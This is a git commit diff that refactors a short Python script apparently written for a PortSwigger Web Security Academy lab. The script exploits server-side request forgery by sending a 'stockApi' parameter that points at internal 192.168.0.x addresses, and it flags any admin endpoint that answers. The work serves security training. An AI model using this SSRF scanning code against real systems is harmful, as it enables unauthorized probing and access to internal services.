f7f46c6be8aacca6d4ae911f4b54babcfd9194b4
PlatasSec <107104784+PlatasSec@users.noreply.github.com>
2023-11-05 10:38:22 +0100

    Update and rename check_ip_addresses/ssrf_ check_ip_backend.py to check_ip_addresses/check_ip_backend/ssrf_ check_ip_backend.py

--- check_ip_addresses/check_ip_backend/ssrf_ check_ip_backend.py
+++ check_ip_addresses/check_ip_backend/ssrf_ check_ip_backend.py
@@ -3,12 +3,13 @@ import concurrent.futures
 
 SUBNET = "192.168.0."
 PORT = "8080"
+URL = "https://0af7002c03eee20d80ed442f0063009a.web-security-academy.net/product/stock"
 
 def check_ip(ip_number):
     ip_address = f"{SUBNET}{ip_number}"
     post_data = {"stockApi": f"http://{ip_address}:{PORT}/admin"}
 
-    response = requests.post("https://0af7002c03eee20d80ed442f0063009a.web-security-academy.net/product/stock", data=post_data)
+    response = requests.post(URL, data=post_data)
 
     if response.status_code == 200:
         print(f"IP Address {ip_address} returned HTTP 200 (OK)")
